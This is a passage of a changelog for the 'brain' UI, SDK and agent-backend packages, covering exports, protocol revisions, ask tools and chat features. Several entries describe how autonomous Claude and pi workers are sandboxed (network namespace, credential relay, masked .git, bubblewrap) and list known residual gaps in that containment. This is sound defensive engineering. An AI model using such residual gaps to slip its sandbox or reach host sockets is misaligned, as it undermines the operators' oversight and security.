  - `@schlessera/brain-ui-server`: `WsHost` keeps its configuration fields, `registry` and `close()`. Its connection, client-set, catalog, turn, activity, inbox, draft, label and classification members are `@internal`, as are the matching `WsHostOptions` fields. `SessionCatalog` and `createSessionCatalog` move to `@schlessera/brain-ui-server/internal`; a custom session catalog is no longer supported, so build the host with `createApp`.
  - `@schlessera/brain-ui-react`: `useChatStore`, `useFileStore`, `useShareStore`, `useUIStore` and `useVoiceStore` are typed as `ShellStoreHook<View>` over the new `ChatShellState`, `FileShellState`, `ShareShellState`, `UIShellState` and `VoiceShellState`, which hold the fields a shell reads and calls. The selector form and the `getState()`/`subscribe()` statics remain; `setState` is no longer typed. `activeChat`, `anyStreaming` and `hasPendingShare` take the views. `ShareIntakeState` is no longer exported, the full store state types leave the public surface, and `BrainUiRoot.stores` is `@internal`.
  - Moved to `/internal`, with no compatibility promise: `collectStats` and `CollectStatsOptions` (`@schlessera/brain/internal`); `MAX_ROUTE_BYTES` (the new `@schlessera/brain-geo/internal`); `applyExportLinkPolicy` and `protectExportLinkDestinations` (`@schlessera/brain-render-template/internal`); `TOKENS`, `LIGHT_TOKENS`, `canvas` and `TokenName` (`@schlessera/brain-ui-kit/internal`); the SDK's bridge-tool handlers (`handleAskUser`, `handleAskUserForm`, `handleAskUserList`, `handleAskUserRank`, `handleGetCurrentLocation`, `handleQueryActivity`, `handleRequestImageMask`, `handleShowBlock`, with `ImageMaskHandlerOptions` and `LocationHandlerOptions`), `wrapCommand` and `execWrapperSpawnOptions` (`@schlessera/brain-ui-sdk/internal`); `describeRetry`, `canonicalModelId` and `resolveThinkingLevel`, from every SDK entry (`/internal` and `/internal/client`); `createToolRendererRegistry`, `pruneStoredShares`, `ShareTargetError`, `isShareTargetRequest` and `handleShareTargetRequest` (`@schlessera/brain-ui-sdk/internal/client`). `registerShareTarget` and `readShareLaunchParams` stay on `/share-target`.
  - Kept and documented: `repoRelativePathSchema` (module config schemas), `MEASURED_RUNTIME` and `runScrape`.

  The migration list is in `docs/decisions/public-export-boundary.md`.

- 02fd0b9: `@schlessera/brain-ui-sdk/server` now exports the helpers both shipped backends use, so a third-party backend can give the host the same behavior and security posture without reaching into `/internal`. The new names, all `@experimental` until 1.0: the bridge-tool handlers (`handleAskUser`, `handleAskUserForm`, `handleAskUserList`, `handleAskUserRank`, `handleGetCurrentLocation`, `handleQueryActivity`, `handleRequestImageMask`, `handleShowBlock`, with `ImageMaskHandlerOptions` and `LocationHandlerOptions`) and `BRIDGE_TOOL_POSTURE`; the exec wrapper (`wrapCommand`, `validateExecWrapper`, `EXEC_WRAPPER_ENV`, `EXEC_KILLER_ENV`); the subprocess environment filter (`filterSubprocessEnv`, `parseSubprocessEnvExtra`, `SubprocessEnvAudience`); the lock keys (`BRAIN_LOCK_KEY`, `bashLockKey`); `describeRetry`, `resolveThinkingLevel`, `assertLoadedSdk`, `rtkRewriteCommand`; and the bundled `DEFAULT_CONFIRM_BASH_PATTERNS`, whose entries may still change between releases. Their behavior is unchanged. They are no longer exported from the unsupported `@schlessera/brain-ui-sdk/internal` entry; first-party code imports them from `/server`.
- 825cd04: Breaking (pre-1.0, ruled on #343 question 1): package entry points now export only the supported API. Names that only brain-kit's own packages used moved to `/internal` entry points, which have no compatibility guarantee and need the same lockstep version: `@schlessera/brain/internal` (path-safety, scratch, generated-region, taxonomy, context and write helpers, in addition to the existing native-handle helpers), and the new `@schlessera/brain-scrape/internal`, `@schlessera/brain-render-template/internal`, `@schlessera/brain-ui-kit/internal`, `@schlessera/brain-ui-server/internal` and `@schlessera/brain-ui-sdk/internal/client`; `@schlessera/brain-ui-sdk/internal` and `@schlessera/brain-backend-pi/internal` gain entries. Other incidental exports were removed: core's database, indexing, ingestion, search, archive, audit, validation, skills-discovery and config-loading functions (use `@schlessera/brain/queries` for content-index reads), the modules' ledger, scoring, routing and database helpers, pi's runtime building blocks, Claude's model-discovery helpers, ui-sdk's per-kind block schemas, tone tables, classification and web-search internals, ui-server's route, cron, staging and keyterm helpers, ui-react's URL helpers and default-root singletons, and the link-policy duplicates on the ui-kit root (use `@schlessera/brain-ui-kit/links`). Every removed or moved name, with its migration path, is listed in `docs/decisions/public-export-boundary.md`. The supported surface includes every type reachable through a public signature; from 1.0, breaking it needs a major version.
- 543231e: Failed Activity runs offer **Send bug report**: a sibling button on failed history rows (`Report` below 480px) and a button under the run detail receipt. It opens the editable review the chat failure card uses, prefilled with allowlisted facts only; failure text and job name are explicit, redacted and capped inclusions, and only the final action opens a prefilled public GitHub issue draft. `SystemStatus` now declares the `software: { release, sourceCommit }` object `/api/status` already serves (additive).
- 5416a22: Notify recipients about waiting Actions. Push-eligible decisions (score 12 or
  more) collect in a fixed 60-second window per recipient and leave as one
  counted notice that opens Actions. Each device is evaluated on its own:
  strict local quiet hours from 22:00 to 08:00, at most one known successful
  push per waiting episode, and bounded retries that resend only what is still
  waiting and unsent. Lower-priority decisions and FYIs join the in-app digest
  at the client's local 09:00 and 17:00, listing only work not already reported
  to that client. Clients report their IANA zone on registration, rebind,
  reconnection, foreground return and zone change; without a usable zone,
  timed notices stay pending instead of using server time. Additive: optional
  `timeZone` on `POST /api/push/subscribe`, `timeZone` in subscription
  summaries, the SDK worker renewal sends its zone, and the
  `ActionDigestEntry`/`ActionDigestSummary`/`ActionDigestState` protocol types.
- 98baa4c: Interactive answers are delivered with receipts (breaking for ask answers,
  #910). A host now settles an `ask_user`, `ask_user_list`, `ask_user_rank` or
  `ask_user_form` answer only when it carries a `submissionId`, and tells the
  sender what happened with an `ask_answer_receipt`. **Compatibility break:**
  an older client's answer, which carries no `submissionId`, is refused with an
  `ASK_ANSWER_UPDATE_REQUIRED` error and the question stays waiting. An updated
  client shows "Update needed" instead of answering a host that does not
  advertise `askReceipts`. Update the client and the host together. Tool
  approvals, dismissals, location and mask replies are unchanged.

  The wire protocol is revision 5. It adds `ask_answer_status`, `ping`/`pong`
  liveness probes, `server_hello.principalKey`, and the `askReceipts` and
  `liveness` capabilities. After `session_resume` the host re-sends that
  session's pending questions. On the Claude backend an ask's request id is
  now the model's `tool_use` id, so a card rebuilt from history answers the
  same request as the live one.

  `BrainUiClient` probes a foreground socket after 15 seconds without traffic
  and replaces it if no `pong` arrives within 5 seconds. It also abandons a
  connection attempt that has delivered nothing after 10 seconds, and exposes
  `checkLiveness()`, `setForeground()`, `supportsAskReceipts` and `hello`.

  In the chat UI, a request delivered twice, or after history, is one card.
  A submitted answer is saved on the device (IndexedDB), then sent. It shows
  as answered only on the host's receipt, and it is retried automatically after
  a reconnect or a reload. The queue holds up to 16 answers and 16 MiB for up
  to 24 hours. It is coordinated across tabs, and it is cleared at sign-out.
  Each card shows where its answer stands, with Cancel sending, Copy answer,
  Send as message, Edit and Try again where they apply. After Submit, focus
  moves to that status rather than to the composer.

- 75e79b6: Let a client that reloads, reconnects or comes back to a session learn from
  the host what that session's latest work actually is. A host now advertises
  `server_hello.capabilities.sessionRecovery` and answers
  `GET /api/sessions/:id/recovery` with the latest accepted request (its
  `requestId`, the `turnId` that runs it, and whether it is queued, running,
  terminal with its Activity outcome, or unknown), a persisted revision that
  orders acceptance, and the approvals and questions still waiting in the
  session. A newer queued request is never reported as an older success, a
  restart never resurrects a lost queue or turn, and whatever the host cannot
  prove reads `unknown`. Replayed history may carry a host-proven `turnId` on
  the answer that ended each turn. A `session_resume` now re-sends the
  session's pending approvals, and the transcript draws a turn shell holding
  the card, marked `restored`, when the replay ends on the user's message, so a
  reload no longer loses a pending approval. Additive: the `SessionRecovery*`
  types, `sessionRecoverySchema`, `classifySessionRecoveryResponse`, the
  optional `SessionHistoryMessage.turnId`, and the React API client's
  `sessionRecovery()`.
- 18d5dde: Keep each session's unsent composer draft on the host, so its text and images
  survive a reload, a closed tab or a host restart and come back on the same
  operator's other devices. The host stores drafts in its own operational
  database (never `brain.db`) behind six authenticated routes under
  `/api/drafts`: list, read, save with `If-Match` and `Idempotency-Key`, upload
  an image, delete (leaving a tombstone) and bind an unbound draft to the
  session its accepted first message started. Concurrent saves of one revision
  get one success and a `DRAFT_CONFLICT` carrying the host's version; nothing
  is merged, evicted or expired. Limits are 64 KB of text, 8 MB per draft, 100
  drafts and 256 MB per host. Additive: `server_hello.capabilities.sessionDrafts`
  with `server_hello.sessionDraftLimits`, the optional `chat_message.draftRef`
  (an accepted message consumes exactly that revision), the `Draft*` protocol
  types and response schemas, and `If-Match`/`Idempotency-Key` in the
  configured CORS allow-list.
- 6f06be8: Expose shared durable inbox tool contracts and eagerly attached first-party bridge executors. Reuse authorized store reads and compensated trusted intake, enforce current turn and budget-admitted origin scope, and require an exact approved session/Action binding for deterministic resolution. Voice and restricted turns refuse mutations; deferred discuss sessions remain disabled.
- 84b8e00: Run autonomous Claude and pi turns inside a restricted envelope. The worker gets a private network namespace with only loopback and an explicit read envelope instead of the host root, so it cannot read the host home, stored logins or the server's environment, and cannot reach the network, DNS or host Unix sockets. Inference leaves only through a server-owned relay socket that forwards the provider's inference routes to the profile's upstream and injects the server-held credential; the worker holds a placeholder. Restricted turns load no project settings, instructions, skills, hooks, MCP servers or pi extensions, and use only the server's instruction snapshot and enforced tool roster.

  Additive SDK surface: `AutonomousTurnOptions.containment: "restricted"`, `BackendCapabilities.restrictedAutonomous`, and an optional `supportsRestricted` argument to `assertTurnPosture`. `runAutonomousTurn` always requests containment and refuses a backend without the capability. A restricted turn refuses before any worker starts when the host cannot establish the envelope, when a Claude subscription profile has no `CLAUDE_CODE_OAUTH_TOKEN` (a stored login is never copied into the envelope), or when a pi profile has no API key for an Anthropic Messages or OpenAI-compatible provider. Interactive, voice and handoff-summary turns are unchanged. Nothing dispatches autonomous work in production yet.

- 90d83d8: Run every Claude turn inside the isolated worker and apply hosted PNG masks through the bounded server operation.
- ef479fd: Offer device-local unassigned voice capture on cached offline launches and from re-authentication, with locked account recordings shown only as aggregate size. Explain the one-online-load requirement in the worker's last-resort response.
- d2436b8: Continue a conversation on another backend (#61). The locked model picker, a session row's overflow and the ⌘K palette open a review sheet that drafts a handoff summary with the source's own model (falling back to a draft from the last six messages), lets you edit it and pick references, and starts a new linked chat on the chosen backend. The source keeps its history, backend and accounting and shows a forward marker; the new chat opens with a handoff card linking back. Additive wire: `chat_message.handoff`, `handoff_prepare`/`handoff_prepare_cancel`/`handoff_status`, `handoff_draft`/`handoff_receipt`, message source `handoff` and `ChatSession.handoffFrom`. A repeated handoff key never creates a second session. `ModelPicker` gains an optional `lockedAction`.
- 56cf3e3: Retain completed-response usage when restricted autonomous turns escalate or yield. Settle successful checkpoints using observed spend and a conservative allowance for any uncertain request, while preserving whole reservations for crashes and missing receipts.
- 33af7e2: Support external dictation providers through `createApp({ speechProvider })`,
  with explicit-selection mismatch errors, session validation and no silent
  fallback. Publish `runSpeechProviderContract` and `runAsrClientContract` with
  keyless transport harnesses, and document the matching public client registry
  and authoring types. Dictation interfaces remain experimental until 1.0;
  live conversation and permission authority retain their separate boundaries.
- b04f98b: Pause hygiene review with a durable Actions-limit retirement reason and let explicit Resume admit a fresh card under the shared hard cap. Retain confirmed operation receipts across retirement and recovery.
- 978031a: Add a deterministic human-started hygiene review backed by durable Actions, with pause/resume, confirmed CLI previews, persisted failure outcomes and check-only interrupted-write recovery. Extend the inbox contract with bounded handler input and hygiene effects. Existing generic cards display the new effect as unavailable until the separate hygiene surface is implemented.
- e632b50: Add explicit human-started hygiene finding refresh. Refresh replaces an obsolete
  Action with current CLI evidence and previews, retains a superseded receipt,
  and refuses old confirmations without changing Markdown or review position.
  The CLI supports read-only targeted `hygiene next --finding <id> --dry-run`.
- d89e175: Add agent-authored inline graph blocks with bounded topology, deterministic layout, supplied edges, safe local-file links and accessible replay/static lists. GraphView can disable implicit focus connections and wrap bounded labels.
- 533c0a7: Add the live-conversation host contract (#957). `@schlessera/brain-ui-sdk/server`
  exports the experimental `LiveConversationProvider` seam with runtime
  validation, and the protocol gains the additive, negotiated `conversation_*`
  frames and `tool_resolution`. `createApp({ conversationProvider })` registers a
  provider beside dictation: the host admits work only on a client's semantic
  commit, runs it through the ordinary backend with the voice posture
  (new `StartTurnRequest.posture: "voice"`: Claude selects `VOICE_ALLOWED_TOOLS`,
  pi refuses the turn), never
  publishes a result for a cancelled, withdrawn or replaced request, and keeps a
  once-only permission announcement ledger across epochs. Clients that declare
  `toolResolution` learn whether a permission request was granted, denied,
  expired with its turn, or unknown. Legacy and rev-3 clients see no change.
  No provider adapter ships.
- 8d966cf: Transcribe retained recordings only after explicit upload consent through the server. Add optional saved-audio speech support, read-only capability/status discovery, durable account-owned receipts and tombstones, and at most three explicit retries for definitive transient provider failures. Deepgram supports saved containers; Web Speech remains unavailable. Retain local audio through failures and durable transcript review, coordinate tabs, and never upload automatically on reconnect or reload.
- 83585eb: Route hosted capture, update, archive and permitted Markdown edits through a bounded server-owned application boundary with current authority, policy/alias denial and exact base hashes. Add hosted structured tools, preserve voice capabilities and archive confirmation, and explain CLI refusals in read-only workers.
- 0e4290f: Write show_block's unchanged inputs with shared tone, valueTone and icon definitions and omit redundant field descriptions. The selected schema form passed Claude and Pi openai-codex request/handler checks; accepted inputs and renderer behavior remain unchanged.
- 70275b9: Reject unknown fields at the block and item levels of new `show_block` suggestions calls, including unsupported item `tone`, in both Claude and pi. This is a breaking accepted-input tightening shipped as a pre-1.0 minor. Stored and replayed suggestions still discard unknown fields and render when otherwise valid; malformed payloads keep the generic fallback. Other block kinds retain their existing behavior.
- 7b4f62a: Add a bounded data-only `show_block` supporting-files variant rendered through RelatedFiles in chat, replay and static exports. Keep file opening in the current root, omit invented scores and sample metadata, and make actionable rows at least 44px tall.
- b05d556: `show_block` gains a `tracker` block (#1001): issues and pull requests the agent opened, closed, reopened, merged, labeled, commented on or reviewed, as `{ kind: "tracker", events: [{ url, action, qualifier?, title }] }` with 1-20 events.

  - **ui-kit:** `TrackerPillList` draws each event as one tappable line, `action [qualifier] · number · title ↗`, under run headers that name the host and repository. Repository, number and type are derived from a GitHub-shaped `url`; any other address shows only its title, action and host. Long titles truncate instead of wrapping, a refused address draws a withheld line with no anchor, more than six events collapse to five behind `Show all N changes` (a shared image or PDF draws them all, titles in full), and the list always says the changes are as reported by the brain.
  - **ui-sdk:** the schema rejects an event carrying any key besides its four, so a payload cannot state a repository, number or type, and the handler rejects an event whose address the link policy refuses, naming its position and the reason. The `show_block` description tells the model to use `tracker` instead of listing tracker changes in prose; the per-turn brief is unchanged.
  - **ui-react:** the block renderer draws `tracker` blocks.

- 96ad470: Add the shared read-only bubblewrap worker launcher and refuse interactive,
  voice, autonomous and handoff-summary turns before runtime initialization when
  the actual host boundary probe fails. Native macOS and Windows hosts refuse.
  Expose the SDK's environment descriptors at the root export; the worker payload
  is internal transport, required only by the trusted bootstrap.

### Patch Changes

- daf4546: Run the scripts of HTML files in the file viewer, isolated from the app. A new authenticated `GET /api/files/html?path=…` serves an `.html`/`.htm` file under the same path, auth and size rules as `?raw=1`. Its CSP `sandbox allow-scripts` directive gives the document an opaque origin, and `connect-src 'none'` and `form-action 'none'` keep it off the network. It is the only response sent with `X-Frame-Options: SAMEORIGIN`; every other response keeps `DENY`. The viewer's preview now loads that route in an `allow-scripts` iframe, and an "Open in new tab" link opens it full-screen with the same isolation. A previewed page cannot read the app's DOM, cookies or storage, call `/api/*`, open popups, submit forms, download files or navigate the app. It can still navigate itself to another site, carrying what it can read, and a tab shows it under the app's host: both are accepted residual risks (#1084). The SDK's default service-worker policy never answers an `/api` navigation from the app shell.
- 1caadca: Add `@schlessera/brain-common`, an internal-only package with no compatibility promise. Its `./internal/env` entry holds the environment descriptor core and `./internal/frontmatter` holds the cache-free `parseFrontmatter`. The packages that carried byte-identical copies of these files now depend on it instead. Environment and frontmatter parsing behave exactly as before, and every public export is unchanged. module-finance, module-jobs, module-travel and ui-server no longer depend on `gray-matter` directly.
- 368c318: Restricted autonomous workers no longer see the brain's `.git`: a directory is masked by an empty read-only tmpfs and a gitlink file cannot be opened, which hides git's fsmonitor socket, hooks and configuration. A `.git` symlink, which cannot be masked, refuses the restricted turn. Other Unix sockets that a host process listens on inside the read envelope remain reachable; this residual is documented.
- b180a2f: Fall back to the original command when the optional RTK rewrite oracle closes stdin before consuming its request.
- 2a7de32: Preserve leading dots in bare and inline-code chat links to scratch files and
  directories, and document preview/download through direct links while scratch
  remains hidden from normal file-tree browsing.
- Updated dependencies [45326b1]
- Updated dependencies [07f5a26]
- Updated dependencies [07345fa]
- Updated dependencies [ca68cbc]
- Updated dependencies [b0815ec]
- Updated dependencies [341bee1]
- Updated dependencies [9ef25ef]
- Updated dependencies [bddc92b]
- Updated dependencies [2c3e5bd]
- Updated dependencies [1caadca]
- Updated dependencies [b68dd15]
- Updated dependencies [b68dd15]
- Updated dependencies [dcdda5d]
- Updated dependencies [a9a3376]
- Updated dependencies [825cd04]
- Updated dependencies [618064d]
- Updated dependencies [2529d28]
- Updated dependencies [f21c430]
- Updated dependencies [2808074]
- Updated dependencies [067d63c]
- Updated dependencies [a95f7c2]
- Updated dependencies [6a46e7f]
- Updated dependencies [0c156cb]
- Updated dependencies [ee4bcf0]
- Updated dependencies [e7f0ff3]
- Updated dependencies [7e398dc]
- Updated dependencies [62c912c]
- Updated dependencies [d2436b8]
- Updated dependencies [f752ff9]
- Updated dependencies [1a8ba32]
- Updated dependencies [d89e175]
- Updated dependencies [9adc62e]
- Updated dependencies [97021a4]
- Updated dependencies [416bda6]
- Updated dependencies [9e8dc3e]
- Updated dependencies [fd01063]
- Updated dependencies [7e398dc]
- Updated dependencies [c1052e2]
- Updated dependencies [5d48d1d]
- Updated dependencies [a713b14]
- Updated dependencies [5b1cd90]
- Updated dependencies [ad855ce]
- Updated dependencies [374bdd6]
- Updated dependencies [27671c2]
- Updated dependencies [879352b]
- Updated dependencies [9857f6f]
- Updated dependencies [9857f6f]
- Updated dependencies [4c92b91]
- Updated dependencies [0c156cb]
- Updated dependencies [7b4f62a]
- Updated dependencies [693cb3e]
- Updated dependencies [b05d556]
- Updated dependencies [3dddcc9]
  - @schlessera/brain-ui-kit@0.41.0
  - @schlessera/brain-geo@0.41.0
  - @schlessera/brain-common@0.41.0

## 0.40.0

### Minor Changes

- 0575b1b: Add `ask_user_list`, a bridge tool that asks the user to place up to 30 items on one shared scale of 2–8 options in a single card, for rating, triage and sorting. The result maps item ids to the chosen option, lists the skipped ids, and carries optional per-item notes. It ships as new `ask_user_list_request` / `ask_user_list_response` protocol frames, a kit `AskUserListCard` (inline chip grid, "set the rest to …" with undo, a Submit that states what it will send and never silently does nothing), and a transcript binding that replays the answered summary after a reload. Both backends expose it, and withhold it from turns that have no one to show a card to. `ask_user` is unchanged.
- dee9b10: BREAKING: `createApp`, `probeClaudeRuntime` and `BackendModule.probeRuntime` now return promises; migrate callers to `await`.

  Boot version probes now cancel at their five-second deadline with bounded cleanup.

- 6267d4f: Add explicit nonpersistent autonomous turns and synchronous escalation capture.
  Both backends preserve ordinary session behavior while headless attempts keep
  runtime identity and usage in Activity without saving interactive history. This
  supplies turn plumbing; autonomous dispatch remains gated on containment,
  budgets, admission and system verification.
- 96b2339: Define the supported backend permission toolkit and record its signatures and reachable types. Permission behavior and runtime policy values are unchanged.

  Breaking before 1.0: SDK `/server` no longer exports `DEFAULT_CONFIRM_BASH_PATTERNS`, `ARCHIVING_UPDATE_REASON`, `archivesDocument`, `bashCommand`, `SubprocessEnvAudience`, `SUBPROCESS_ENV`, `filterSubprocessEnv` or `parseSubprocessEnvExtra`. Claude's root no longer exports `DEFAULT_CONFIRM_BASH_PATTERNS` or `VOICE_ALLOWED_TOOLS`; pi's root no longer exports `DEFAULT_PI_ALLOWED_TOOLS` or `TOOL_RISK`. First-party consumers use the owning package's explicit `/internal` entry at the same lockstep version; those paths have no compatibility guarantee. External authors use the documented `/server` permission operations and configurable policy formats. Subscription-auth helpers remain public protocol API.

- 0aaabdd: Enforce each backend's actual imported SDK copies against its owning manifest constraints and optional host minima. Direct factories accept `versionRequirements`; Claude holds constrained start/resume prompts until its selected executable probe and SDK handshake pass. Pi reports its primary SDK at boot without a separate executable identity. Preserve measured-pair warnings, provenance, numeric defaults and terminal frames.
- c849bf2: Tighten pre-1.0 backend conformance: the published testing harness now requires
  a permission probe and checks denied mutations, enforced allowlists, no-grant
  turns and rejection before runtime execution. Backends that silently ignore
  requested restrictions no longer conform, and existing harnesses must implement
  `permission(scenario)`. Add the published `runBackendModuleContract` descriptor
  suite for profile parsing and resolution. Ordinary-turn defaults are unchanged.
- 0c0c9df: Add `ask_user_form` for conditional questions answered in one card, with shared scale and ranking controls, configurable depth/node/options limits, visible-answer validation and history replay. Keep the existing ask tools available.
- cbc683a: Define durable Queue/Action frames and strict v1 effect validation; safely ignore the new frames in clients awaiting subscription wiring.
- f19da8b: Add authenticated `brain queue add` intake with explicit replay keys and scoped
  principal-cookie transport. Shares now create durable untrusted triage work,
  deduplicate normalized content, preserve server-owned provenance, and reconcile
  failed staging/database writes. Queueing does not file content or enable
  autonomous execution.
- c1a1595: Render recoverable failed-turn cards with reviewed diagnostics, subscription auth instructions, and a latest-turn Retry that retains original inputs and checks delivery after reconnect.
- 95865d1: Add optional host SDK/runtime/content-CLI minima, strict shared SemVer constraint composition, descriptor report verification, and explicit content-CLI rechecks before invocation. Preserve package bounds, default unknown-CLI warnings, and existing runtime report meanings.
- 48c87e1: Reserve interactive capacity while limiting autonomous operations to two by
  default. Shared locks prioritize interactive waiters and cooperatively yield
  long autonomous holders after a configurable 20-second wait. Yield checkpoints
  before abort, drains writers before recovering work, retains completed-call
  receipts and incurred costs, and bounds repeated interruption with a single
  dead-letter Action. Production autonomous dispatch remains disabled.
- 60d9690: A command the client answers itself (`/stats`) can be kept as part of its session (#582). New `local_exchange` client frame (`{ sessionId, exchange: LocalExchange }`), new `local_exchange_result` server frame (`{ sessionId, exchangeId, saved, reason? }`), optional `ClientChatMessage.localExchanges` for a draft conversation's exchanges, and optional `SessionHistoryMessage.localAnswer` (`{ exchangeId, command, answer }`) on replayed assistant messages. `LocalExchange` is `{ id, command, prompt, answer, context }`; the schema bounds `context` to `MAX_LOCAL_CONTEXT_CHARS` and refuses one containing `LOCAL_ANSWER_CLOSE`. All additive: a peer that does not know them ignores them, and a `localAnswer` this build cannot read is dropped rather than failing the history.
- 4503591: Add schema-driven module Settings with per-module JSON overrides, validated revision-guarded saves, explicit source-preserving migrations and separate lifecycle/actions. Jobs exposes its complete scoring format, adapter choices and execution settings, preserving legacy scoring representation during migration and edits.
- a01c389: Add per-message reasoning effort with saved profile defaults for Claude and Pi.
  Claude defaults to Opus 5.5 at medium; each resumed turn re-reads its default,
  unsupported levels resolve downward, and retries retain the original override.
  Expose supported levels and honest requested/confirmed effort metadata. The
  existing model chip opens a model/effort picker; overrides clear on correlated
  start or queue acceptance and remain with refused drafts. Older hosts retain
  their existing send behavior.
- 35fb78d: Add ask_user_rank: one list ordered by handle drag, taps or keyboard, with explicit kept-order results, optional top-N cutoff, and answered transcript replay.
- 49bc6b2: Pre-1.0 breaking tightening: nonempty `confirmBashPatterns` / `BRAIN_UI_CONFIRM_BASH`
  lists with no valid regex now fail backend initialization instead of silently
  disabling confirmation. Repair the reported invalid entries, or explicitly set
  `[]` to disable confirmation. Missing configuration still uses defaults; mixed
  lists keep valid patterns and effects while reporting invalid entries. Malformed
  JSON and structurally unusable environment values retain their existing fallback.
- d9e64c9: Preserve observed retry counts and known rate-limit reset timestamps on terminal failures and durable replay.
- 3f0870d: Attach validated GPX, KML and supported GeoJSON originals in chat, preserving incoming names and MIME separately from detected staged names. Keep server-derived file evidence on queued turns and replay. Draw static track blocks with complete metrics, waypoint evidence, explicit unknown and partial values, separate gaps and original references; resolve assets before PNG/PDF export. Generic share intake remains compatible.
- efafbb3: A turn whose model call failed now says so on the wire (#575). `result` and a bare turn-ending `error` gain an optional `failure` (`TurnFailure`: `errorClass`, `status?`, `message`, `authAction?`), replayed assistant messages gain the same `failure`, and a `status: "thinking"` frame gains an optional `retry` (`TurnRetry`) while the runtime backs off from a failed call. All additive: the schemas drop an unreadable `failure` or `retry` rather than the frame. `describeRetry` gives every backend and client one wording for a retry. `SubscriptionAuthAction`, `SUBSCRIPTION_AUTH_INSTRUCTIONS`, `SUBSCRIPTION_RELOGIN_PROCEDURE` and `subscriptionAuthAction` are now exported from `/protocol` as well as `/server`, so a client can show the #254 instructions. The shared backend contract suite gains optional `apiFailure` and `retrying` harness cases.

### Patch Changes

- f0b84c0: Accept omitted unknown costs in the published backend lifecycle suite while validating reported numeric, nonnegative costs.
- cf6fee6: Preserve and validate prototype-named snapshot sequence entries in the server-frame parser.
- 67c7403: Add the shared geo library with explicit GPX recovery and unit-bearing track summaries, normalized-track recovery and directional proximity measurements while retaining strict travel parsing and measurements.

  Add configured Nominatim geocoding with qualified candidates, explicit service failures, disk cache/source age and shared operator admission across CLI/server processes.

  Add configured prepared-dataset routing and explicit eligible FOSSGIS fallback, with honest source/transfer/cache metadata and nullable provider estimates.

  Add bounded Overpass POI queries near points or along retained track sections, mapped opening-hours unknowns, ordered fallback and persistent admission refusal handling.

  Share the existing SDK coastline/land/road geometry through geo, keeping compatibility exports/result-or-empty behavior while adding canonical configuration, cached layer sources and shared admission.

  Route SDK reverse geocoding through the shared client while retaining its nullable address result. Public Nominatim now requires explicit informed eligibility; the location tool keeps raw coordinates when eligibility is absent. Both first-party backends expose the opt-in setting.

  Add canonical geo configuration to brain config and the UI server adapter, preserving legacy endpoint/privacy switches and keeping disposable response caches separate from permanent geometry caches and global operator admission.

  Add deterministic vector static PNG maps with bundled fonts, preserved track gaps, numbered stops, complete legends and source/attribution evidence. Wide or unavailable backgrounds yield plain maps; unsupported projection, glyphs or image budgets retain complete text without changing source geometry.

  Add brain geo geocode, route, poi, track and map with one-document JSON contracts and qualified human output. Commands share canonical service configuration and cache/admission, retain original track evidence and protect local map writes through brain/scratch containment.

- Updated dependencies [0575b1b]
- Updated dependencies [830127c]
- Updated dependencies [a4d5ef0]
- Updated dependencies [0c0c9df]
- Updated dependencies [c1a1595]
- Updated dependencies [3829fed]
- Updated dependencies [0506c10]
- Updated dependencies [619ee2b]
- Updated dependencies [a01c389]
- Updated dependencies [d934fe0]
- Updated dependencies [35fb78d]
- Updated dependencies [1eaeba2]
- Updated dependencies [67c7403]
- Updated dependencies [3f0870d]
- Updated dependencies [4c1a424]
  - @schlessera/brain-ui-kit@0.40.0
  - @schlessera/brain-geo@0.40.0

## 0.39.0

### Minor Changes

- f5a8f81: The model can offer up to two follow-ups under its answer (#40). `show_block` gains a thirteenth kind, `suggestions`: `label?` and `items[1..2]{label, icon?}`, each label one line of 4-80 characters. That is the data of the kit's `SuggestionChips` without `tone`, and a type test holds the two together in both directions. Both backends offer it through the tool description; the per-turn brief is unchanged.

  `@schlessera/brain-ui-react` draws the turn's last valid call as the answer's closing row, a row of chips after the text and share menu, never where the call was made. A chip puts its words in the composer, below any draft, and never sends: no message, no answer to a pending question, no approval. The row is gone once the reader sends anything. It is not drawn while the turn runs, while a question in the turn is unanswered, when the answer ends in a question, while voice holds the composer, or on a turn spoken in a voice conversation. The client also drops duplicates, a restatement of the reader's own question, and generic filler. The decision reads only the transcript and current state, so a replayed session draws what the live one did. Shares and prints leave suggestions out, and the welcome chips are unchanged.

- cf94a81: `show_block` gains a `link` block (#43): one external page the reader may want to open, as `{ kind: "link", url, title?, description? }`.

  - **ui-kit:** `LinkPreviewCard` gains a link mode, switched on by a new `url` prop, with `description`, `expanded`, `onExpandedChange` and `onCopy`. The card derives the host it shows and the `href` it opens from one parse of `url`, so no caller can supply a host that disagrees with the destination. The host is the first line and is never ellipsised; an internationalised name leads with its ASCII (`xn--`) form and adds a "reads as" line. The title and description render as the brain's words, with an attribution line on every card. Nothing is fetched. The card opens the page only from its `Open ↗` anchor (new tab, no opener, no referrer), and the full address sits behind a disclosure. A refused address draws a "Link withheld" card with no anchor. Without `url` the card is unchanged. The policy is `classifyLink`, exported from `@schlessera/brain-ui-kit` and from the new React-free `@schlessera/brain-ui-kit/links` entry.
  - **ui-sdk:** the `show_block` handler rejects a `link` block whose address `classifyLink` refuses (relative, not `http(s)`, carrying credentials, containing invisible or bidi characters, mixing scripts in one hostname label, or longer than 2,048 characters), naming the reason. ui-sdk now depends on `@schlessera/brain-ui-kit` for that function.
  - **ui-react:** the block renderer draws `link` blocks and copies the exact address to the clipboard from the card's Copy control.

- e5d3cc0: `chat_message` and replayed history messages carry an optional `source` (`typed` | `voice-dictate` | `voice-conversation`), so how a user message was produced survives a reload (#549). `ClientChatMessage.source` says how the client's user produced the message; `SessionHistoryMessage.source` returns it on a replayed `role: "user"` message. Both are additive: absent means `typed`, and a value the receiver does not know reads as absent instead of failing the frame. `messageSourceSchema` is exported from `@schlessera/brain-ui-sdk/schemas`.
- b8c355d: `show_block` gains a `map` block: 1 to 30 named places, drawn on real geography with a numbered list under them that always carries every place (#44). The model supplies places and, when a source states them, coordinates. The surface decides everything the drawing needs: one map, a pair of maps for two groups too far apart for one, or only the list, with a line that says why. The payload has no span, zoom, box, tone or numbering field.

  - **ui-sdk**: `MAP_BLOCK_SCHEMA` joins the block union, and the tool's description and brief name it. `planPlaces` (from `/client`) is the pure plan behind the drawing: rows in payload order, the mode, each frame's geometry box, and whether names fit on the map. A place with no coordinates, at `0, 0` or past ±85° is listed with the reason and never pinned.
  - **ui-kit**: new `PlaceMap` and `PlaceList` blocks. `MapView` gains additive props: `pinMode="number"` (numbered badges, lettered clusters such as `A·5`), `onClusters`, `letterFrom`, `coordChip`, `describe` (an accessible name, with the list as its description), `framed`, and `MapPin.n`. `mapViewBounds` exports the box the view draws. Existing `MapView` output is unchanged.
